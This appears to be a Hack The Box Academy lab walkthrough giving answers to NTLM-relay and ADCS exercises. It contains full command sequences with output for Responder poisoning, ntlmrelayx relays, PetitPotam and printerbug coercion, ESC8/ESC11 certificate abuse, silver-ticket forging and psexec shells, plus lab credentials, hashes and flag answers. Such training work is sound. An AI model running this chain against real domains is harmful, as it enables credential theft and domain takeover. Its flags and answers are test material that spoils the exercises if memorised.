Code: shell

```shell
echo "ldap://172.16.117.3" > target.txt
cat target.txt
```

```
htb-student@ubuntu:~$ echo "ldap://172.16.117.3" > target.txt
htb-student@ubuntu:~$ cat target.txt 
ldap://172.16.117.3
```

Once they have created the `target.txt` file containing the host, students will have to start `ntlmrelayx` as the `root` user or using `sudo`, with the `-tf` target file option and specifying the `target.txt` file, `-smb2support` option providing `SMBv2` support for hosts that require it, `--no-da` option to not attempt to add a Domain Admin, `--no-acl` option to disable ACL attacks, and the `--add-computer` option followed by a computer name of choice.

Code: shell

```shell
sudo ntlmrelayx.py -tf target.txt -smb2support --no-da --no-acl --add-computer "Academy-Student"
```

```
htb-student@ubuntu:~$ sudo ntlmrelayx.py -tf target.txt -smb2support --no-da --no-acl --add-computer "Academy-Student"

[sudo] password for htb-student: 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Running in relay mode to hosts in targetfile
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
```

After a while, students will notice that a relayed authentication created a fake computer on the domain controller named `Academy-Student$` with a randomly generated password.

```
htb-student@ubuntu:~$ sudo ntlmrelayx.py -tf target.txt -smb2support --no-da --no-acl --add-computer "Academy-Student"
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

<SNIP>
[*] Attempting to create computer in: CN=Computers,DC=INLANEFREIGHT,DC=LOCAL
[*] Adding new computer with username: Academy-Student$ and password: >ld/b:k4ie{T7i0 result: OK
```

Subsequently, students will have to utilize `certipy` alongside the credentials for the generated computer, querying all of the enabled certificate templates on the domain controller.

Code: shell

```shell
certipy find -enabled -u 'Academy-Student$'@172.16.117.3 -p '5l}2/.dQifU><dO' -stdout
```

```
htb-student@ubuntu:~$ certipy find -enabled -u 'Academy-Student$'@172.16.117.3 -p '5l}2/.dQifU><dO' -stdout
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Trying to get CA configuration for 'INLANEFREIGHT-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'INLANEFREIGHT-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'INLANEFREIGHT-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'INLANEFREIGHT-DC01-CA'
[*] Enumeration output:
Certificate Authorities
<SNIP>
    [!] Vulnerabilities
      ESC8                              : Web Enrollment is enabled and Request Disposition is set to Issue
      ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue
<SNIP>
 6
    Template Name                       : Machine
    Display Name                        : Computer
    Certificate Authorities             : INLANEFREIGHT-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
<SNIP>
```

They will come to know that there are two vulnerabilities `ESC8` and `ESC11`. Students will have to use `certipy` in its `relay` mode while specifying the certificate authority (`-ca`) and the template name (`-template`).

Code: shell

```shell
sudo certipy relay -target "rpc://172.16.117.3" -ca "INLANEFREIGHT-DC01-CA" -template Machine
```

```
htb-student@ubuntu:~$ sudo certipy relay -target "rpc://172.16.117.3" -ca "INLANEFREIGHT-DC01-CA" -template Machine
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://172.16.117.3 (ESC11)
[*] Listening on 0.0.0.0:445
```

In another terminal SSH session, students will have to use `printerbug.py` located at `tools/krbrelayx` to coerce an authentication to ourselves using the credentials of the computer that was added previously, which will be relayed to the domain controller (`172.16.117.3`).

Code: shell

```shell
cd tools/krbrelayx
python3 printerbug.py inlanefreight/Academy-Student$:'5l}2/.dQifU><dO'@172.16.117.50 172.16.117.30
```

```
htb-student@ubuntu:~$ cd tools/krbrelayx
htb-student@ubuntu:~/tools/krbrelayx$ python3 printerbug.py inlanefreight/Academy-Student$:'5l}2/.dQifU><dO'@172.16.117.50 172.16.117.30
[*] Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Attempting to trigger authentication via rprn RPC at 172.16.117.50
[*] Bind OK
[*] Got handle
DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Triggered RPC backconnect, this may or may not have worked
```

Students will come to know that in the other window, where `certipy` is running in `relay` mode, an authentication from `WS01$` has been relayed successfully, and a certificate has been generated in their current working directory.

```
htb-student@ubuntu:~$ sudo certipy relay -target "rpc://172.16.117.3" -ca "INLANEFREIGHT-DC01-CA" -template Machine
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting [rpc://172.16.117.3](rpc://172.16.117.3) (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:172.16.117.3[135] to determine ICPR stringbinding
[*] Attacking user 'WS01$@INLANEFREIGHT'
[*] Requesting certificate for user 'WS01$' with template 'Machine'
[*] Requesting certificate via RPC
[*] Connecting to ncacn_ip_tcp:172.16.117.3[135] to determine ICPR stringbinding
[*] Connecting to ncacn_ip_tcp:172.16.117.3[135] to determine ICPR stringbinding
[*] Successfully requested certificate
[*] Request ID is 15
[*] Got certificate with DNS Host Name 'WS01.INLANEFREIGHT.LOCAL'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'ws01.pfx'
[*] Exiting...
```

Subsequently, students will have to use `certipy` with its `auth` mode to request a TGT ticket containing the NTLM hash for the `WS01$` machine account using the `.pfx` file previously captured/generated.

Code: shell

```shell
certipy auth -pfx ws01.pfx -dc-ip 172.16.117.3
```

```
htb-student@ubuntu:~$ certipy auth -pfx ws01.pfx -dc-ip 172.16.117.3
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Using principal: ws01$@inlanefreight.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ws01.ccache'
[*] Trying to retrieve NT hash for 'ws01$'
[*] Got hash for 'ws01$@inlanefreight.local': aad3b435b51404eeaad3b435b51404ee:1586de5d4cacc8a7db27329b6d4f3974
```

Students will have to use `lookupsid.py` part of Impacket, to get the domain SID value.

Code: shell

```shell
lookupsid.py 'INLANEFREIGHT.LOCAL/WS01$'@172.16.117.3 -hashes :1586de5d4cacc8a7db27329b6d4f3974
```

```
htb-student@ubuntu:~$ lookupsid.py 'INLANEFREIGHT.LOCAL/WS01$'@172.16.117.3 -hashes :1586de5d4cacc8a7db27329b6d4f3974
Impacket v0.10.1.dev1+20230718.100545.fdbd2568 - Copyright 2022 
Fortra 
[*] Brute forcing SIDs at 172.16.117.3 
[*] StringBinding ncacn_np:172.16.117.3[\pipe\lsarpc] 
[*] Domain SID is: S-1-5-21-1207890233-375443991-2397730614
```

Once they have captured the domain SID value, they will have to use `ticketer.py` part of Impacket to forge a silver ticket and impersonate the domain Administrator account on `WS01$`, accessing the resources by specifying the `CIFS` SPN, allowing them to establish an interactive shell session using `psexec`.

Code: shell

```shell
ticketer.py -nthash 1586de5d4cacc8a7db27329b6d4f3974 -domain-sid S-1-5-21-1207890233-375443991-2397730614 -domain inlanefreight.local -spn cifs/ws01.inlanefreight.local Administrator 
```

```
htb-student@ubuntu:~$ ticketer.py -nthash 1586de5d4cacc8a7db27329b6d4f3974 -domain-sid S-1-5-21-1207890233-375443991-2397730614 -domain inlanefreight.local -spn cifs/ws01.inlanefreight.local Administrator 

Impacket v0.11.0 - Copyright 2023 Fortra

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for inlanefreight.local/Administrator
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Saving ticket in Administrator.ccache
```

With the `ccache` of the Administrator in hand, students will have to utilize the `KRB5CCNAME` attribute and `psexec.py` to establish a shell session on the target machine (`WS01$`) and grab the flag.

Code: shell

```shell
KRB5CCNAME=Administrator.ccache psexec.py -k -no-pass ws01.inlanefreight.local
type C:\Users\Administrator\Desktop\flag.txt
```

```
htb-student@ubuntu:~$ KRB5CCNAME=Administrator.ccache psexec.py -k -no-pass ws01.inlanefreight.local
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Requesting shares on ws01.inlanefreight.local.....
[*] Found writable share ADMIN$
[*] Uploading file ophIbzcN.exe
[*] Opening SVCManager on ws01.inlanefreight.local.....
[*] Creating service hUMR on ws01.inlanefreight.local.....
[*] Starting service hUMR.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> type C:\Users\Administrator\Desktop\flag.txt
Abusing_ADCS_For_FUN
```

Answer: `Abusing_ADCS_For_FUN`

# Skills Assessment

## Question 1

### "After poisoning broadcast traffic with Responder, submit the NetNTLMv2 Username (without the domain) that initiated HTTP NTLM authentication."

Students need to spawn the target machine, and they will have to either use SSH to access the target machine with the provided credentials `htb-student:HTB_@cademy_stdnt!`. Students will have to note that they will need to either establish a few SSH connections to the spawned target machine, use `tmux`, or connect to the target via `RDP`.

Code: shell

```shell
ssh htb-student@STMIP
```

```
┌─[eu-academy-1]─[10.10.14.196]─[htb-ac-8414@htb-7admwdxcua]─[~]
└──╼ [★]$ ssh htb-student@10.129.100.121
The authenticity of host '10.129.100.121 (10.129.100.121)' can't be established.
ECDSA key fingerprint is SHA256:3I77Le3AqCEUd+1LBAraYTRTF74wwJZJiYcnwfF5yAs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.100.121' (ECDSA) to the list of known hosts.
htb-student@10.129.100.121's password: HTB_@cademy_stdnt!
<SNIP>
  
Last login: Wed Aug 30 16:24:31 2023 from 10.10.14.33 
htb-student@ubuntu:~$
```

Subsequently, students need to change their working directory to `tools/Responder`. They will have to turn off the SMB Server and HTTP Server, usually started by `Responder`, by altering the line in the `Responder.conf` configuration file in the same directory. This is done to allow the relayed authentication to go to `ntlmrelayx`.

Code: shell

```shell
cd tools/Responder
sed -i "s/SMB = On/SMB = Off/; s/HTTP = On/HTTP = Off/" Responder.conf
cat Responder.conf | grep -ie "SMB =\|HTTP ="
```

```
htb-student@LINUX02:~$ cd tools/Responder
htb-student@ubuntu:~/tools/Responder$ sed -i "s/SMB = On/SMB = Off/; s/HTTP = On/HTTP = Off/" Responder.conf
htb-student@ubuntu:~/tools/Responder$ cat Responder.conf | grep -ie "SMB =\|HTTP ="
SMB = Off
HTTP = Off
```

Right after, students need to start `Responder`using `sudo` in "poisoning" mode by only specifying the `-I` parameter for the interface (`ens192`). Configuring the tool to poison every broadcast request/traffic.

Code: shell

```shell
sudo python3 Responder.py -I ens192
```

```
htb-student@ubuntu:~/tools/Responder$ sudo python3 Responder.py -I ens192
<SNIP>

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

<SNIP>

[+] Generic Options:
    Responder NIC              [ens192]
    Responder IP               [172.16.119.20]
    Responder IPv6             [fe80::250:56ff:feb9:80f3]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']

[+] Current Session Variables:
    Responder Machine Name     [WIN-6Y3FH7UTIW2]
    Responder Domain Name      [0RAB.LOCAL]
    Responder DCE-RPC Port     [45567]

[+] Listening for events...
```

Students in another terminal session will have to use `CrackMapExec` and its `--gen-relay-list` functionality to generate a file containing the host IP addresses for the subnet 172.16.119.0/24 that don't have SMB signing enabled.

Code: shell

```shell
crackmapexec smb 172.16.119.0/24 --gen-relay-list targets.txt
```

```
htb-student@LINUX02:~$ crackmapexec smb 172.16.119.0/24 --gen-relay-list targets.txt

SMB         172.16.119.70   445    BACKUP01         [*] Windows 10.0 Build 17763 x64 (name:BACKUP01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.119.3    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.119.80   445    SQL03            [*] Windows 10.0 Build 17763 x64 (name:SQL03) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
Running CME against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

Once they have generated such a file, students will have to utilize `ntlmrelayx.py` as the `root` user or with `sudo` to capture the relayed requests, specifying the `-tf` target file option and the `-smb2support` option to support SMB2 if required.

Code: shell

```shell
sudo ntlmrelayx.py -tf ./targets.txt -smb2support
```

```
htb-student@LINUX02:~$ sudo ntlmrelayx.py -tf ./targets.txt -smb2support

[sudo] password for htb-student:
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Running in relay mode to hosts in targetfile
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666
<SNIP>
```

After a while, students will come to know that the user `INLANEFREIGHT/MOZHAR` is attempting to initiate an HTTP NTLM authentication.

```
htb-student@LINUX02:~$ sudo ntlmrelayx.py -tf ./targets.txt -smb2support
[sudo] password for htb-student: 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
<SNIP>
[*] HTTPD(80): Connection from INLANEFREIGHT/MOZHAR@172.16.119.80 controlled, attacking target [smb://172.16.119.70](smb://172.16.119.70)
[*] HTTPD(80): Client requested path: /wopsf6jkup
[*] HTTPD(80): Client requested path: /wopsf6jkup
[*] HTTPD(80): Client requested path: /wopsf6jkup
[*] HTTPD(80): Authenticating against [smb://172.16.119.70](smb://172.16.119.70) as INLANEFREIGHT/MOZHAR SUCCEED
[*] HTTPD(80): Connection from INLANEFREIGHT/MOZHAR@172.16.119.80 controlled, attacking target [smb://172.16.119.3](smb://172.16.119.3)
<SNIP>
```

Answer: `MOZHAR`

# Skills Assessment

## Question 2

### "Compromise BACKUP01 and then submit the flag located at 'C:\\Users\\Administrator\\Desktop\\flag.txt'"

Students will reuse the previously spawned target and the SSH session, and they will have to utilize the relayed HTTP authentication to add a fake computer in the domain using `ntlmrelayx.py` with the LDAP protocol and the options, `-smb2support` to enable SMB2 support if required, `--no-da` to not attempt to add a Domain Admin, `--no-acl` to disable ACL related attacks and `--add-computer` to attempt to add a new computer account in the domain.

They need to have `Responder` running in poisoning mode with the configurational changes from the previous question.

Once students have initiated `ntlmrelayx.py`, after a while, they will notice that the user `Mozhar` has successfully added the computer account in the domain.

Code: shell

```shell
sudo ntlmrelayx.py -t ldap://INLANEFREIGHT\\mozhar@172.16.119.3 -smb2support --no-da --no-acl --add-computer 'Academy-Student'
```

```
htb-student@LINUX02:~$ sudo ntlmrelayx.py -t ldap://INLANEFREIGHT\\mozhar@172.16.119.3 -smb2support --no-da --no-acl --add-computer 'Academy-Student'
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client SMTP loaded..
<SNIP>
[*] HTTPD(80): Authenticating against [ldap://INLANEFREIGHT\mozhar@172.16.119.3](ldap://INLANEFREIGHT\mozhar@172.16.119.3) as INLANEFREIGHT/MOZHAR SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] All targets processed!
[*] HTTPD(80): Connection from INLANEFREIGHT/MOZHAR@172.16.119.80 controlled, but there are no more targets left!
[*] Adding a machine account to the domain requires TLS but ldap:// scheme provided. Switching target to LDAPS via StartTLS
[*] HTTPD(80): Client requested path: /xml;
[*] HTTPD(80): Client requested path: /xml;
[*] All targets processed!
[*] HTTPD(80): Connection from INLANEFREIGHT/MOZHAR@172.16.119.80 controlled, but there are no more targets left!
[*] Attempting to create computer in: CN=Computers,DC=INLANEFREIGHT,DC=LOCAL
[*] Adding new computer with username: Academy-Student$ and password: >}<0!t_-8vG*Ugd result: OK
<SNIP>
```

Right after the students have successfully created a rogue computer account in the domain, they will need to utilize `CrackMapExec` with its `adcs` module to enumerate the certificate authority and the templates in the domain:

Code: shell

```shell
crackmapexec ldap 172.16.119.3 -u 'Academy-Student$' -p '>}<0!t_-8vG*Ugd' -M adcs
```

```
htb-student@LINUX02:~$ crackmapexec ldap 172.16.119.3 -u 'Academy-Student$' -p '>}<0!t_-8vG*Ugd' -M adcs

SMB         172.16.119.3    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
LDAP        172.16.119.3    389    DC01             [+] INLANEFREIGHT.LOCAL\Academy-Student$:>}<0!t_-8vG*Ugd 
ADCS        172.16.119.3    389    DC01             [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS                                                Found PKI Enrollment Server: DC01.INLANEFREIGHT.LOCAL
ADCS                                                Found CN: INLANEFREIGHT-DC01-CA
```

While enumerating the templates, they will come to know that there is a `Machine` template.

Code: shell

```shell
crackmapexec ldap 172.16.119.3 -u 'Academy-Student$' -p '>}<0!t_-8vG*Ugd' -M adcs -o SERVER=INLANEFREIGHT-DC01-CA
```

```
htb-student@LINUX02:~$ crackmapexec ldap 172.16.119.3 -u 'Academy-Student$' -p '>}<0!t_-8vG*Ugd' -M adcs -o SERVER=INLANEFREIGHT-DC01-CA

SMB         172.16.119.3    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
LDAP        172.16.119.3    389    DC01             [+] INLANEFREIGHT.LOCAL\Academy-Student$:>}<0!t_-8vG*Ugd 
ADCS                                                Using PKI CN: INLANEFREIGHT-DC01-CA
ADCS        172.16.119.3    389    DC01             [*] Starting LDAP search with search filter '(distinguishedName=CN=INLANEFREIGHT-DC01-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,'
<SNIP>                                           
Found Certificate Template: Machine
<SNIP>
```

Students will have to use `ntlmrelayx` to target the `HTTP` protocol and the domain controller and `--adcs` enabling an ADCS attack followed by `--template` to specify the `Machine` template. Right after they have started `ntlmrelayx`:

Code: shell

```shell
sudo ntlmrelayx.py -t http://172.16.119.3/certsrv/certfnsh.asp -smb2support --adcs --template Machine
```

```
htb-student@LINUX02:~$ sudo ntlmrelayx.py -t http://172.16.119.3/certsrv/certfnsh.asp -smb2support --adcs --template Machine
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server

[*] Setting up RAW Server on port 6666
[*] Servers started, waiting for connections
```

Students will have to utilize `PetitPotam.py` located in `tools/PetitPotam` to coerce an authentication from the `BACKUP01` (`172.16.119.70`) host to themselves `172.16.119.20`:

Code: shell

```shell
cd tools/PetitPotam
python3 PetitPotam.py -u 'Academy-Student$' -p '>}<0!t_-8vG*Ugd' 172.16.119.20 172.16.119.70
```

```
htb-student@LINUX02:~$ cd tools/PetitPotam
htb-student@LINUX02:~/tools/PetitPotam$ python3 PetitPotam.py -u 'Academy-Student$' -p '>}<0!t_-8vG*Ugd' 172.16.119.20 172.16.119.70

<SNIP>

Trying pipe lsarpc
[-] Connecting to ncacn_np:172.16.119.70[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

Subsequently, once students have initiated the coerce authentication through `PetiPotam`, they will come to know that a certificate was generated in `ntlmrelayx.py`:

```
htb-student@LINUX02:~$ sudo ntlmrelayx.py -t http://172.16.119.3/certsrv/certfnsh.asp -smb2support --adcs --template Machine
Impacket v0.11.0 - Copyright 2023 Fortra

<SNIP>
[*] Setting up RAW Server on port 6666
[*] Servers started, waiting for connections
[*] SMBD-Thread-5: Received connection from 172.16.119.70, attacking target [http://172.16.119.3](http://172.16.119.3/)
[*] HTTP server returned error code 200, treating as a successful login
[*] Authenticating against [http://172.16.119.3](http://172.16.119.3/) as INLANEFREIGHT/BACKUP01$ SUCCEED
[*] SMBD-Thread-7: Connection from 172.16.119.70 controlled, but there are no more targets left!
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] GOT CERTIFICATE! ID 13
[*] Base64 certificate of user BACKUP01$: 
MIIRlQIBAzCCEU8GCSqGSIb3DQEHAaCCEUAEghE8MIIRODCCB28GCSqGSIb3DQEHBqCCB2AwggdcAgEAMIIHVQYJKoZIhvcNAQcBMBwGCiqGSIb3DQEMAQMwDgQILbx1K/A7w/MCAggAgIIHKC5xa3MexBMvexaQSIVTmrKCOwa+09v7odqK2PQ8Tolj1BoviNJi2rIbF2bgT67FankaT9Odi/44r7v88qYiH3yN+ZyDBry8Ex5AgNtxP1Z8/4mjNaFmzj+C4ce5Ly+6awmLlTxNwRRyScDMXZgM14CWLCrUOBOPvhBDy5J0tAd+YZ9zxl3t<SNIP>
QIHJJULn8eSEg=
```

Students need to copy the base64 certificate and decode it while saving it to a `.pfx` file, which will be used to request a TGT ticket.

Code: shell

```shell
echo -n "MIIRlQIBAzCCEU8GCSqGSIb3DQEHAaCCEUAEghE8MIIRODCCB28GCSqGSIb3DQEHBqCCB2AwggdcAgEAMIIHVQYJKoZIhvcNAQcBMBwGCiqGSIb3DQEMAQMwDgQILbx1K/A7w/MCAggAgIIHKC5xa3MexBMvexaQSIVTmrKCOwa+09v7odqK2PQ8Tolj1BoviNJi2rIbF2bgT67FankaT9Odi/44r7v88qYiH3yN+ZyDBry8Ex5 <SNIP> u48f38vsjQSgQIHJJULn8eSEg=" | base64 -d > backup01.pfx
```

```
htb-student@LINUX02:~$ echo -n "MIIRlQIBAzCCEU8GCSqGSIb3DQEHAaCCEUAEghE8MIIRODCCB28GCSqGSIb3DQEHBqCCB2AwggdcAgEAMIIHVQYJKoZIhvcNAQcBMBwGCiqGSIb3DQEMAQMwDgQILbx1K/A7w/MCAggAgIIHKC5xa3MexBMvexaQSIVTmrKCOwa+09v7odqK2PQ8Tolj1BoviNJi2rIbF2bgT67FankaT9Odi/44r7v88qYiH3yN+ZyDBry8Ex5 <SNIP> u48f38vsjQSgQIHJJULn8eSEg=" | base64 -d > backup01.pfx
```

Subsequently, students will utilize `gettgtpkinit.py` located in `tools/PKINITtools/` directory to request a TGT ticket from the domain controller (`172.16.119.3`) for the `BACKUP01$` computer account and save it as a `ccache` file.

Code: shell

```shell
python3 tools/PKINITtools/gettgtpkinit.py -dc-ip 172.16.119.3 -cert-pfx backup01.pfx 'INLANEFREIGHT/BACKUP01$' backup01.ccache
```

```
htb-student@LINUX02:~$ python3 tools/PKINITtools/gettgtpkinit.py -dc-ip 172.16.119.3 -cert-pfx backup01.pfx 'INLANEFREIGHT/BACKUP01$' backup01.ccache
2023-09-08 06:33:10,794 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2023-09-08 06:33:11,450 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2023-09-08 06:33:19,274 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2023-09-08 06:33:19,274 minikerberos INFO     806c1b08f874ffbf323970c103d428a978bf787a97fd8ada9fff6f398b4124bb
INFO:minikerberos:806c1b08f874ffbf323970c103d428a978bf787a97fd8ada9fff6f398b4124bb
2023-09-08 06:33:19,279 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

Right after they have gotten the TGT ticket file, students will need to get the NT hash for the `BACKUP01$` computer account using the encryption key from the previous command (`gettgtpkinit.py`).

Code: shell

```shell
KRB5CCNAME=backup01.ccache python3 tools/PKINITtools/getnthash.py 'INLANEFREIGHT/BACKUP01$' -key 806c1b08f874ffbf323970c103d428a978bf787a97fd8ada9fff6f398b4124bb
```

```
htb-student@LINUX02:~$ KRB5CCNAME=backup01.ccache python3 tools/PKINITtools/getnthash.py 'INLANEFREIGHT/BACKUP01$' -key 806c1b08f874ffbf323970c103d428a978bf787a97fd8ada9fff6f398b4124bb

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
11d2b884b8b3383ace4a68b8e1d23a8f
```

Once students have recovered the NT hash of the computer account (`BACKUP01$`), they will have to use `lookupsid.py` to get the domain SID.

Code: shell

```shell
lookupsid.py 'INLANEFREIGHT.LOCAL/BACKUP01$'@172.16.119.3 -hashes :11d2b884b8b3383ace4a68b8e1d23a8f
```

```
htb-student@LINUX02:~$ lookupsid.py 'INLANEFREIGHT.LOCAL/BACKUP01$'@172.16.119.3 -hashes :11d2b884b8b3383ace4a68b8e1d23a8f

Impacket v0.10.1.dev1+20230718.100545.fdbd2568 - Copyright 2022 Fortra

[*] Brute forcing SIDs at 172.16.119.3
[*] StringBinding ncacn_np:172.16.119.3[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1207890233-375443991-2397730614
498: INLANEFREIGHT\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: INLANEFREIGHT\Administrator (SidTypeUser)
501: INLANEFREIGHT\Guest (SidTypeUser)
502: INLANEFREIGHT\krbtgt (SidTypeUser)
<SNIP>
```

Having obtained the domain SID, students will have to use `ticketer.py` to request a ticket for the Administrator user, while targeting the `CIFS` service.

Code: shell

```shell
ticketer.py -nthash 11d2b884b8b3383ace4a68b8e1d23a8f -domain-sid S-1-5-21-1207890233-375443991-2397730614 -domain inlanefreight.local -spn cifs/backup01.inlanefreight.local Administrator
```

```
htb-student@LINUX02:~$ ticketer.py -nthash 11d2b884b8b3383ace4a68b8e1d23a8f -domain-sid S-1-5-21-1207890233-375443991-2397730614 -domain inlanefreight.local -spn cifs/backup01.inlanefreight.local Administrator

Impacket v0.10.1.dev1+20230718.100545.fdbd2568 - Copyright 2022 Fortra

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for inlanefreight.local/Administrator
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Saving ticket in Administrator.ccache
```

Students need to add an entry in the `/etc/hosts` file to resolve the `backup01.inlanefreight.local` host.

Code: shell

```shell
sudo sh -c "echo '172.16.119.70 backup01.inlanefreight.local' >> /etc/hosts"
tail /etc/hosts
```

```
htb-student@LINUX02:~$ sudo sh -c "echo '172.16.119.70 backup01.inlanefreight.local' >> /etc/hosts"

htb-student@LINUX02:~$ tail /etc/hosts

<SNIP>
172.16.119.70 backup01.inlanefreight.local
```

Alternatively, students can utilize the `ldap-shell` functionality of `certipy` to add a new computer and establish Resource-Based Constrained Delegation between a new computer and the domain controller:

Code: shell

```shell
certipy auth -pfx backup01.pfx  -dc-ip 172.16.119.3 -ldap-shell
add_computer esc1 E$C1
set_rbcd BACKUP01$ ESC1$
exit
```

```
htb-student@LINUX02:~$ certipy auth -pfx backup01.pfx  -dc-ip 172.16.119.3 -ldap-shell
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Connecting to 'ldaps://172.16.119.3:636'
[*] Authenticated to '172.16.119.3' as: u:INLANEFREIGHT\BACKUP01$
Type help for list of commands

# add_computer esc1 E$C1
Attempting to add a new computer with the name: esc1$
Inferred Domain DN: DC=INLANEFREIGHT,DC=LOCAL
Inferred Domain Name: INLANEFREIGHT.LOCAL
New Computer DN: CN=esc1,CN=Computers,DC=INLANEFREIGHT,DC=LOCAL
Adding new computer with username: esc1$ and password: E$C1 result: OK

# set_rbcd BACKUP01$ ESC1$
Found Target DN: CN=BACKUP01,OU=Servers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
Target SID: S-1-5-21-1207890233-375443991-2397730614-2103

Found Grantee DN: CN=esc1,CN=Computers,DC=INLANEFREIGHT,DC=LOCAL
Grantee SID: S-1-5-21-1207890233-375443991-2397730614-4604
Delegation rights modified successfully!
